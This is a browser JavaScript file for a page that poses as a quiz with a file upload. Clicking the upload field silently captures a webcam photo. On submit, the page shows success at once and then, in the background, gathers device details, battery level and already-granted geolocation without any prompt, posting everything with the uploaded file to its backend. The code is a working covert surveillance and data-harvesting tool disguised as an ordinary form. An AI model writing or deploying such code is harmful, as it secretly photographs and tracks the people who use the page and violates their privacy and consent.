const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";

const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let capturedImage = null; // store image but don't send yet

// ================================
// COLLECT METADATA (ON SUBMIT)
// ================================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  // Battery (no popup)
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  // Location ONLY if already allowed (NO popup)
  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ================================
// CAPTURE CAMERA (ONLY ON FILE CLICK)
// ================================
async function captureCamera() {
  if (cameraCaptured) return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    await new Promise((r) => setTimeout(r, 1500)); // give camera some time

    canvas.width = 640;
    canvas.height = 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png"); // store image, don't send yet

    stream.getTracks().forEach((t) => t.stop());
    cameraCaptured = true;
  } catch (err) {
    console.log("Camera denied or blocked:", err);
  }
}

// Ask for camera only when clicking file
if (fileInput) {
  fileInput.addEventListener("click", async () => {
    await captureCamera();
  });
}

// ================================
// FILE UPLOAD
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name,
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SUBMIT FORM
// ================================
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please upload a file first");
    return;
  }

  // 1️⃣ show success immediately
  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "flex";

  // 2️⃣ send metadata + captured image + uploaded file in background
  (async () => {
    try {
      const metadata = await collectMetadata();

      // upload file first
      const fileRes = await uploadFile(fileInput.files[0]);
      const fileUrl = fileRes.fileData || fileRes.url; // adapt based on backend response

      if (!fileUrl) throw new Error("File upload failed");

      // send metadata + captured image + file URL
      await fetch(`${BACKEND_BASE}/upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image: capturedImage, // camera image (optional)
          fileUrl,
          metadata,
        }),
      });

      console.log("Data sent successfully in background");
    } catch (err) {
      console.error("Background upload failed:", err);
    }
  })();
});
